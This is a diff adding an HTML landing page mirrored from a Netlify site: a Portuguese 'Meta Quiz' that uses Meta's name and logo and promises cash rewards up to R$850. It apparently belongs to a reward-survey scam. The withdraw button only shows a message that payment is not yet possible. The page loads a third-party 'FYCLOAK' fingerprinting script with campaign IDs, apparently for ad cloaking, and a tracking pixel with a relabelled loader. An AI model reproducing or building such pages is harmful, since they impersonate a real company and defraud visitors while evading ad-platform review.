@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<!-- Mirrored from Meta-psquisa.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 08 Nov 2025 16:07:27 GMT --><!-- Added by HTTrack -->
+
+<head>
+  <meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Meta Quiz</title>
+  <link rel="stylesheet" href="css/main.css">
+  <link rel="stylesheet" href="css/quiz.css">
+  <link rel="stylesheet" href="css/modal.css">
+  <link rel="stylesheet" href="css/animations.css">
+  <link rel="stylesheet" href="css/pages.css">
+
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+  <!-- Meta Pixel Code Start -->
+  <script>
+    !function (w, d, t) {
+      w.MetaAnalyticsObject = t; var ttq = w[t] = w[t] || []; ttq.methods = ["page", "track", "identify", "instances", "debug", "on", "off", "once", "ready", "alias", "group", "enableCookie", "disableCookie", "holdConsent", "revokeConsent", "grantConsent"], ttq.setAndDefer = function (t, e) { t[e] = function () { t.push([e].concat(Array.prototype.slice.call(arguments, 0))) } }; for (var i = 0; i < ttq.methods.length; i++)ttq.setAndDefer(ttq, ttq.methods[i]); ttq.instance = function (t) {
+        for (
+          var e = ttq._i[t] || [], n = 0; n < ttq.methods.length; n++)ttq.setAndDefer(e, ttq.methods[n]); return e
+      }, ttq.load = function (e, n) {
+        var r = "https://analytics.Meta.com/i18n/pixel/events.js", o = n && n.partner; ttq._i = ttq._i || {}, ttq._i[e] = [], ttq._i[e]._u = r, ttq._t = ttq._t || {}, ttq._t[e] = +new Date, ttq._o = ttq._o || {}, ttq._o[e] = n || {}; n = document.createElement("script")
+          ; n.type = "text/javascript", n.async = !0, n.src = r + "?sdkid=" + e + "&lib=" + t; e = document.getElementsByTagName("script")[0]; e.parentNode.insertBefore(n, e)
+      };
+
+
+      ttq.load('D4JL28RC77UA1JCPVDT0');
+      ttq.page();
+    }(window, document, 'ttq');
+  </script>
+  <!-- Meta Pixel Code End -->
+
+
+  <script>
+    window.FYCLOAK_CAMPAIGN_ID = 137;  // ID da sua campanha
+    window.FYCLOAK_USER_ID = 28;      // Seu user ID
+  </script>
+  <script src="https://cdn.fycloak.com/scripts/advanced-fingerprint.js"></script>
+
+  <script src="https://cdn.jsdelivr.net/gh/xTracky/static@latest/utm-handler.js"
+    data-token="e5f8f055-a4b1-4ca5-98ba-9decd4d3eaa1">
+    </script>
+
+  <!-- <script type="text/javascript">
+    (function(c,l,a,r,i,t,y){
+        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+    })(window, document, "clarity", "script", "u7aymtlp61");
+</script> -->
+
+  <style>
+    /* Modal final oculta inicialmente */
+    #final-modal {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.7);
+      /* Fundo escuro semi-transparente */
+      z-index: 9999;
+      justify-content: center;
+      align-items: center;
+      font-family: 'Arial', sans-serif;
+    }
+
+    /* Modal é exibida quando possui a classe active */
+    #final-modal.active {
+      display: flex;
+    }
+
+    /* Conteúdo da modal com fundo lilás/roxo */
+    #final-modal .modal-content.final-content {
+      background: linear-gradient(to bottom, #a049f5, #9d4edd);
+      border-radius: 20px;
+      padding: 30px 20px;
+      text-align: center;
+      color: #fff;
+      max-width: 350px;
+      width: 90%;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+      position: relative;
+    }
+
+    /* Cabeçalho "Parabéns!" */
+    #final-modal .reward-header {
+      font-size: 18px;
+      font-weight: bold;
+      color: #e0caff;
+      margin-bottom: 10px;
+    }
+
+    /* Mensagem "Você completou o quiz e ganhou" */
+    #final-modal .reward-message {
+      font-size: 20px;
+      font-weight: 600;
+      margin-bottom: 10px;
+    }
+
+    /* Valor da recompensa em dourado */
+    #final-modal .reward-amount {
+      font-size: 42px;
+      font-weight: bold;
+      color: #FFD700;
+      /* Cor dourada */
+      margin: 10px 0 20px;
+    }
+
+    /* Informação adicional de agradecimento */
+    #final-modal .reward-info {
+      font-size: 16px;
+      margin-bottom: 25px;
+      color: #fff;
+    }
+
+    /* Botão "Receber recompensa" */
+    #final-modal .continue-reward-btn {
+      background: #ffffff;
+      color: #000000;
+      font-size: 16px;
+      font-weight: bold;
+      padding: 14px 24px;
+      border: none;
+      border-radius: 30px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+    }
+
+    #final-modal .continue-reward-btn:hover {
+      background: #f0f0f0;
+    }
+
+    .modal-saque-container {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.7);
+      z-index: 99999;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .modal-saque-content {
+      background-color: #fff;
+      border-radius: 15px;
+      width: 90%;
+      max-width: 350px;
+      overflow: hidden;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+      animation: modalFadeIn 0.3s;
+    }
+
+    @keyframes modalFadeIn {
+      from {
+        opacity: 0;
+        transform: translateY(-20px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    .modal-saque-header {
+      background-color: #0064e0;
+      color: white;
+      padding: 15px 20px;
+      font-weight: bold;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    .modal-saque-body {
+      padding: 20px;
+      text-align: center;
+    }
+
+    .modal-saque-close {
+      font-size: 24px;
+      cursor: pointer;
+      line-height: 1;
+    }
+
+    .Meta-logo {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .logo-img {
+      width: 102px;
+      max-width: 100%;
+      height: auto;
+      display: block;
+      object-fit: contain;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="app-container">
+    <div class="quiz-header">
+      <div class="Meta-logo">
+        <img src="images/Meta-Logo.png" alt="Meta" class="logo-img">
+      </div>
+      <div class="balance-container">
+        <div class="balance">R$<span id="current-balance">0</span></div>
+        <button class="withdraw-btn">SACAR</button>
+      </div>
+    </div>
+
+    <div class="progress-bar-container">
+      <div id="progress-bar" class="progress-bar"></div>
+    </div>
+
+    <div id="quiz-container" class="quiz-container">
+      <!-- Questions will be dynamically inserted here -->
+    </div>
+
+    <!-- Modal de Saque -->
+    <div id="modalsaque" class="modal-saque-container">
+      <div class="modal-saque-content">
+        <div class="modal-saque-header">
+          <span>Atenção</span>
+          <span class="modal-saque-close">�</span>
+        </div>
+        <div class="modal-saque-body">
+          <p>Não é possível realizar o saque do valor ainda. É necessário prosseguir com a pesquisa.</p>
+        </div>
+      </div>
+    </div>
+
+
+    <div id="modalsaque">
+      <div class="modal-content">
+        <div class="modal-header">
+          <span>Atenção</span>
+          <span class="close-modal">�</span>
+        </div>
+        <div class="modal-body">
+          <p>Não é possível realizar o saque do valor ainda. É necessário prosseguir com a pesquisa.</p>
+        </div>
+      </div>
+    </div>
+
+    <div id="reward-modal" class="modal">
+      <div class="modal-content">
+        <div class="reward-header">Nova recompensa</div>
+        <div class="reward-message">Você ganhou</div>
+        <div class="reward-amount">R$<span id="reward-value">0.00</span></div>
+        <div class="reward-info">
+          Responda mais pesquisas<br>
+          para ganhar até R$850
+        </div>
+        <button id="continue-reward-btn" class="continue-reward-btn">Continuar recebendo</button>
+      </div>
+    </div>
+
+    <div id="final-modal" class="modal">
+      <div class="modal-content final-content">
+        <div class="reward-header">Parabéns!</div>
+        <div class="reward-message">Você completou o quiz e ganhou</div>
+        <div class="reward-amount">R$<span id="total-reward">559.51</span></div>
+        <div class="reward-info">
+          Obrigado por participar da nossa pesquisa!
+        </div>
+        <button id="restart-btn" class="continue-reward-btn">Receber recompensa</button>
+      </div>
+    </div>
+
+    <div class="terms-footer">
+      <p>Ao participar das atividades de recompensa, você concorda com nossos <a href="#">Termos</a> e <a
+          href="#">Condições</a>.</p>
+    </div>
+  </div>
+
+
+
+  <div id="confetti-container"></div>
+
+
+  <script src="js/utils.js"></script>
+  <script src="js/confetti.js"></script>
+  <script src="js/rewards.js"></script>
+  <script src="js/quiz.js"></script>
+  <script src="js/pages.js"></script>
+  <script src="js/app.js"></script>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      // Elementos
+      const withdrawBtn = document.querySelector('.withdraw-btn');
+      const modalSaque = document.getElementById('modalsaque');
+      const closeModal = document.querySelector('.modal-saque-close');
+
+      // Abrir modal
+      withdrawBtn.addEventListener('click', function () {
+        modalSaque.style.display = 'flex';
+      });
+
+      // Fechar modal
+      closeModal.addEventListener('click', function () {
+        modalSaque.style.display = 'none';
+      });
+
+      // Não fecha ao clicar fora (removido o event listener)
+    });
+  </script>
+
+
+
+</body>
+<!-- Mirrored from Meta-psquisa.netlify.app/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 08 Nov 2025 16:07:41 GMT -->
+
+</html>
